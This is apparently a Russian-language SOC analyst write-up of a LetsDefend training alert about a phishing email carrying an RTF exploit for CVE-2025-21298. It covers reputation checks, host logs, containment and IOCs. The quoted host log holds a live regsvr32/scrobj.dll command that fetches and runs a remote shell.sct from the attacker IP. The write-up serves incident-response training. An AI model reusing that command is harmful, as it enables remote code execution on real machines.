# Description

# Basic Information
```
EventID: 314
Event Time: Feb, 04, 2025, 04:18 PM
Rule: SOC336 - Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)
Level: Security Analyst
SMTP Address: 84.38.130.118
Source Address: projectmanagement@pm.me
Destination Address: Austin@letsdefend.io
E-mail Subject: Important: Action Required for Upcoming Project Deadline
Attachment: mail.rtf
Attachment Hash: df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184
Device Action: Allowed
Trigger Reason: Malicious RTF attachment identified with known CVE-2025-21298 exploit pattern.
```

# Investigation

Подозрение на вредоносное вложение формата RTF содержащее в себе потенциальное ВПО (exploit) для эксплуатации уязвимости CVE-2025-21298. Согласно информации из открытых источников:

CVE-2025-21298 - это уязвимость с нулевого дня в Windows OLE (*Windows Object Linking and Embedding*), технологии, которая позволяет внедрять документы и другие объекты и создавать ссылки на них.  

Злоумышленники могут воспользоваться этим недостатком, отправив вредоносное электронное письмо, содержащее вредоносный документ RTF.  

Когда жертва открывает или просматривает электронное письмо в Microsoft Outlook, срабатывает уязвимость, позволяющая злоумышленнику выполнить произвольный код в уязвимой системе.

По логам Email Security обнаружил письмо, содержащее тему и тело:
```
Important: Action Required for Upcoming Project Deadline

Dear Austin,

We are reaching out to remind you of the upcoming project deadline. Please review the attached document for critical details regarding the next steps and your responsibilities to ensure the project stays on track.

Best regards,

Project Management Team
```

<img width="1191" height="696" alt="image" src="https://github.com/user-attachments/assets/b2f9ada4-b9e4-4ea8-8465-093d9f9b8c77" />

Есть несколько моментов, которые могут указывать на потенциальный фишинг:
1) Домен отправителя;
2) В теме письма указано `Important` + `upcoming dedline` + `critical details` + `responsibilities`, т.е. слова указывающие на срочность выполнения с надеждой на то, что пользователь быстро откроет вложение и не обратит внимания на детали.

Проверим хэш вложения по открытым площадкам:
## VirusTotal
23/62 вендоров отмечают файл как вредоносный. Доминирующая сигнатура: Exploit/CVE-2025-21298

<img width="1346" height="1289" alt="image" src="https://github.com/user-attachments/assets/81da161b-24b8-40bf-ba91-f6ea722a72ef" />

## FileScan.io

Не найдено репортов с упоминанием данного хэша

<img width="821" height="369" alt="image" src="https://github.com/user-attachments/assets/48e9fb04-84d3-4b39-acce-79232d3f60c3" />

По наименованию вложения `mail.rtf` тоже пусто

<img width="441" height="201" alt="image" src="https://github.com/user-attachments/assets/8a8b459b-923d-49af-87db-cbe69dfff0aa" />

## OpenTIP Kaspersky

Результат: Вредоносное ПО
Сигнатура: HEUR:Exploit.RTF.CVE-2025-21298.gen

<img width="2034" height="1054" alt="image" src="https://github.com/user-attachments/assets/72a64f75-36a2-483f-8c92-f5bcaaeae1ef" />

Перед анализом письма в песочнице проверим логи с АРМ пользователя, не зафиксировано ли странной активности после открытия письма. Для этого отметим: 
* время получения письма - **Feb, 04, 2025, 05:12 AM**;
* имя пользователя - **Austin@letsdefend.io**

И мы находим такую машину, теперь детальней разберем активность:

<img width="1286" height="1167" alt="image" src="https://github.com/user-attachments/assets/d6bc6199-e461-42cd-932d-eb293d6c944b" />

По событиям на хосте зафиксирован запуск процесса C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE.
Родительский процесс: C:\Windows\explorer.exe
Дата и время возникновения: Feb 04 2025 08:05:15
Действие выполнялось под учетной записью: DESKTOP-USER\Austin

Далее в Feb 04 2025 08:06:08 зафиксирован запуск процесса C:\Windows\System32\cmd.exe.
Запускаемая команда: "C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"
Родительский процесс: C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE
Действие выполнялось под учетной записью: DESKTOP-USER\Austin

scrobj.dll — это динамическая библиотека (DLL) от Microsoft с официальным названием Windows Script Component Runtime. Она входит в состав различных версий Windows и предназначена для поддержки компонентов сценариев (script components), реализуемых на базе COM (Component Object Model).

Команда заставляет Windows с помощью regsvr32.exe загрузить и выполнить удалённый скрипт с помощью возможностей scrobj.dll.

По информации из открыты источников: 84[.]38[.]130[.]118

## OpenTIP Kaspersky
IP-адрес является вредоносным

<img width="1977" height="938" alt="image" src="https://github.com/user-attachments/assets/5c532d02-2147-4bd6-87d2-656c0aa1623e" />

## VirusTotal
6 вендров из 94 отмечают, что IP-адрес вредоносный

<img width="1406" height="523" alt="image" src="https://github.com/user-attachments/assets/96ae4def-dd8a-41aa-9c88-98a1c45cacdc" />

## Abuse.ch
Вредоносный, используется для распространения ВПО. Предоположительно, ВПО относится к семейству `Sliver`.

<img width="1322" height="773" alt="image" src="https://github.com/user-attachments/assets/fbd2eccc-f82c-451a-b8f1-859ecfa2299d" />

<img width="1272" height="774" alt="image" src="https://github.com/user-attachments/assets/7fdbec01-f7f2-4c4a-abb8-61e0b38de0c4" />

## Filescan.io
Не является вредоносным

<img width="683" height="284" alt="image" src="https://github.com/user-attachments/assets/7e2116d7-916c-4d45-9dd2-6e727e2afa27" />

# Answers
## Task1.

<img width="686" height="261" alt="image" src="https://github.com/user-attachments/assets/e9cc7b93-7baf-46f3-9b28-0f562f640aba" />

## Task2. 

Согласно логам с Прокси + с хоста ВПО не было удалено, переход на ресурс не был зафиксирован:

<img width="583" height="276" alt="image" src="https://github.com/user-attachments/assets/abd82122-64e6-4227-a6b2-11c89241a2b1" />

## Task3. Analyze Malware

<img width="735" height="354" alt="image" src="https://github.com/user-attachments/assets/e6c641e9-2688-46c3-bfc0-41c5a538016d" />

Конечно Malicious :)

## Task4. Check if Someone Requested the C2

<img width="771" height="397" alt="image" src="https://github.com/user-attachments/assets/dcb64404-7767-410a-820e-c189a5b97684" />

**Accessed**

## Task5. Containment

<img width="1225" height="539" alt="image" src="https://github.com/user-attachments/assets/754d526b-41b1-4d45-a4ae-5bebec5798e6" />


<img width="743" height="331" alt="image" src="https://github.com/user-attachments/assets/e6441cb9-9f25-49fd-8718-65ada278da4f" />

## Conclusion

Была выполнена успешная эксплуатации уязвимости **CVE-2025-21298**. Атака не была зафиксировано средствами АВПО и МСЭ. Хост изолирован.

<img width="1202" height="308" alt="image" src="https://github.com/user-attachments/assets/a1575514-02b5-453c-bf6b-2c30b912507a" />

## IOCs

* 84.38.130[.]118 - С2 Server IP
* pm[.]me - Malicious Email sender domain
* projectmanagement@pm[.]me - Email Sender
* shell.sct - Payload
* scrobj.dll - DLL Library for execution scripts
* hXXp[://]84[.]38[.]130[.]118[.]com/shell.sct - Malicious URL for download payload
